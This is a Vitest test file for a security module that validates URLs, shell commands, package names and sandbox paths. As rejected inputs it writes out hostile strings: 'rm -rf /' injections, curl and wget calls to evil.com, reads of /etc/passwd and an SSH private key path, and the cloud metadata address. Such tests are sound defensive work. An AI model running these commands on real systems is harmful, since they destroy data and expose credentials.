import { describe, it, expect } from 'vitest';
import {
  validateUrl,
  validateCommand,
  validatePackageName,
  sanitizePackageList,
  checkRateLimit,
  validateSandboxPath,
  validateString,
} from '@/lib/security';

describe('Security Module', () => {
  describe('validateUrl', () => {
    it('accepts valid HTTPS URLs', () => {
      const result = validateUrl('https://example.com');
      expect(result.valid).toBe(true);
      expect(result.url?.hostname).toBe('example.com');
    });

    it('accepts valid HTTP URLs', () => {
      const result = validateUrl('http://example.com');
      expect(result.valid).toBe(true);
    });

    it('rejects localhost', () => {
      expect(validateUrl('http://localhost:3000').valid).toBe(false);
      expect(validateUrl('http://127.0.0.1').valid).toBe(false);
      expect(validateUrl('http://0.0.0.0').valid).toBe(false);
    });

    it('rejects private network IPs', () => {
      expect(validateUrl('http://10.0.0.1').valid).toBe(false);
      expect(validateUrl('http://172.16.0.1').valid).toBe(false);
      expect(validateUrl('http://192.168.1.1').valid).toBe(false);
    });

    it('rejects cloud metadata endpoints', () => {
      expect(validateUrl('http://169.254.169.254').valid).toBe(false);
      expect(validateUrl('http://metadata.google.internal').valid).toBe(false);
    });

    it('rejects non-HTTP protocols', () => {
      expect(validateUrl('file:///etc/passwd').valid).toBe(false);
      expect(validateUrl('ftp://example.com').valid).toBe(false);
      expect(validateUrl('javascript:alert(1)').valid).toBe(false);
    });

    it('rejects invalid URLs', () => {
      expect(validateUrl('not-a-url').valid).toBe(false);
      expect(validateUrl('').valid).toBe(false);
    });
  });

  describe('validateCommand', () => {
    it('allows whitelisted commands', () => {
      const result = validateCommand('npm install react');
      expect(result.valid).toBe(true);
      expect(result.cmd).toBe('npm');
      expect(result.args).toEqual(['install', 'react']);
    });

    it('allows ls, pwd, cat', () => {
      expect(validateCommand('ls -la').valid).toBe(true);
      expect(validateCommand('pwd').valid).toBe(true);
      expect(validateCommand('cat package.json').valid).toBe(true);
    });

    it('blocks non-whitelisted commands', () => {
      expect(validateCommand('bash -c "rm -rf /"').valid).toBe(false);
      expect(validateCommand('python3 script.py').valid).toBe(false);
    });

    it('blocks shell metacharacters', () => {
      expect(validateCommand('npm install; rm -rf /').valid).toBe(false);
      expect(validateCommand('ls | grep secret').valid).toBe(false);
      expect(validateCommand('echo $PATH').valid).toBe(false);
      expect(validateCommand('echo `whoami`').valid).toBe(false);
    });

    it('blocks dangerous commands', () => {
      expect(validateCommand('curl http://evil.com').valid).toBe(false);
      expect(validateCommand('wget http://evil.com').valid).toBe(false);
      expect(validateCommand('sudo anything').valid).toBe(false);
    });

    it('blocks path traversal', () => {
      expect(validateCommand('cat ../../etc/passwd').valid).toBe(false);
    });

    it('rejects empty/invalid input', () => {
      expect(validateCommand('').valid).toBe(false);
      expect(validateCommand('   ').valid).toBe(false);
      expect(validateCommand(null as any).valid).toBe(false);
      expect(validateCommand(undefined as any).valid).toBe(false);
    });

    it('rejects overly long commands', () => {
      const longCmd = 'npm ' + 'a'.repeat(2500);
      expect(validateCommand(longCmd).valid).toBe(false);
    });
  });

  describe('validatePackageName', () => {
    it('accepts valid package names', () => {
      expect(validatePackageName('react')).toBe(true);
      expect(validatePackageName('react-dom')).toBe(true);
      expect(validatePackageName('@types/react')).toBe(true);
      expect(validatePackageName('@radix-ui/react-dialog')).toBe(true);
      expect(validatePackageName('lodash-es')).toBe(true);
    });

    it('accepts packages with version specifiers', () => {
      expect(validatePackageName('react@18.2.0')).toBe(true);
      expect(validatePackageName('react@^18.0.0')).toBe(true);
      expect(validatePackageName('@types/react@18.2.0')).toBe(true);
    });

    it('rejects dangerous names', () => {
      expect(validatePackageName('')).toBe(false);
      expect(validatePackageName(null as any)).toBe(false);
      expect(validatePackageName('; rm -rf /')).toBe(false);
      expect(validatePackageName('../../../etc/passwd')).toBe(false);
      expect(validatePackageName('UPPERCASE')).toBe(false);
    });
  });

  describe('sanitizePackageList', () => {
    it('filters and deduplicates packages', () => {
      const result = sanitizePackageList(['react', 'react', 'react-dom', '']);
      expect(result.valid).toEqual(['react', 'react-dom']);
    });

    it('separates valid and invalid packages', () => {
      const result = sanitizePackageList(['react', '; rm -rf /', 'lodash']);
      expect(result.valid).toEqual(['react', 'lodash']);
      expect(result.invalid).toEqual(['; rm -rf /']);
    });

    it('handles non-array input', () => {
      const result = sanitizePackageList('not-an-array');
      expect(result.valid).toEqual([]);
    });
  });

  describe('checkRateLimit', () => {
    it('allows requests within limits', () => {
      const key = `test-${Date.now()}-${Math.random()}`;
      const result = checkRateLimit(key, 5, 60_000);
      expect(result.allowed).toBe(true);
      expect(result.remaining).toBe(4);
    });

    it('blocks requests exceeding limits', () => {
      const key = `test-block-${Date.now()}-${Math.random()}`;
      for (let i = 0; i < 3; i++) {
        checkRateLimit(key, 3, 60_000);
      }
      const result = checkRateLimit(key, 3, 60_000);
      expect(result.allowed).toBe(false);
      expect(result.remaining).toBe(0);
    });
  });

  describe('validateSandboxPath', () => {
    it('accepts valid sandbox paths', () => {
      const result = validateSandboxPath('src/App.tsx');
      expect(result.valid).toBe(true);
    });

    it('accepts absolute paths within sandbox', () => {
      const result = validateSandboxPath('/home/user/app/src/App.tsx');
      expect(result.valid).toBe(true);
    });

    it('rejects path traversal', () => {
      expect(validateSandboxPath('../../etc/passwd').valid).toBe(false);
      expect(validateSandboxPath('../../../root/.ssh/id_rsa').valid).toBe(false);
    });

    it('rejects null bytes', () => {
      expect(validateSandboxPath('file\0.txt').valid).toBe(false);
    });

    it('rejects empty paths', () => {
      expect(validateSandboxPath('').valid).toBe(false);
      expect(validateSandboxPath(null as any).valid).toBe(false);
    });
  });

  describe('validateString', () => {
    it('accepts valid strings', () => {
      const result = validateString('hello world', 'test');
      expect(result.valid).toBe(true);
      expect(result.value).toBe('hello world');
    });

    it('trims whitespace', () => {
      const result = validateString('  hello  ', 'test');
      expect(result.valid).toBe(true);
      expect(result.value).toBe('hello');
    });

    it('rejects non-strings', () => {
      expect(validateString(123, 'test').valid).toBe(false);
      expect(validateString(null, 'test').valid).toBe(false);
    });

    it('rejects empty strings', () => {
      expect(validateString('', 'test').valid).toBe(false);
      expect(validateString('   ', 'test').valid).toBe(false);
    });

    it('rejects strings exceeding max length', () => {
      const long = 'a'.repeat(101);
      expect(validateString(long, 'test', 100).valid).toBe(false);
    });
  });
});
